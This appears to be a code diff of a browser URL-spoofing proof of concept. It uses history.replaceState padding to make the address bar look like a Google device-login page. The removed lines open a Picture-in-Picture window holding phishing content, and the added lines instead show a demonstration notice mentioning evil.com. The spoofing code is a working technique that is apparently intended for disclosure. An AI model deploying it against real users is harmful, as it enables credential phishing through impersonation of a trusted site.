@@ -1,30 +1,23 @@
-<style>
-    #content {
-        display: none;
-    }
-</style>
+<button id="button">Click PoC</button>
 
-<button id="button">Open PIP</button>
-
-<div id="content">
-    phishing page content here
+<div id="indicator" style="display:none; padding:10px; margin-top:10px; background:#ffee99; border:1px solid #ccaa33;">
+    <b>Hi, this is the official Google page.</b><br>
+    Please note the URL above — the Google page has been redirected to 
+    <a href="https://evil.com">evil.com</a>.
 </div>
 
 <script>
-    const pipOpen = async () => {
-        history.replaceState(null, '', '?...............................https://accounts.google.com/login/device/verify');
+// Ambil button
+const button = document.getElementById('button');
 
-        const pipWindow = await documentPictureInPicture.requestWindow({
-            width: 330,
-            height: 317
-        });
-        
-        setTimeout(() => {
-            history.replaceState(null, '', '/');
-        }, 1000);
+button.onclick = () => {
 
-        pipWindow.document.body.append(content);
-    };
+    // Fake Url injection
+    history.replaceState(null, '', '?...............................https://accounts.google.com/login/device/verify');
 
-    button.onclick = pipOpen;
+    // Delay 3 detik sebelum note muncul
+    setTimeout(() => {
+        document.getElementById('indicator').style.display = 'block';
+    }, 3000);
+};
 </script>
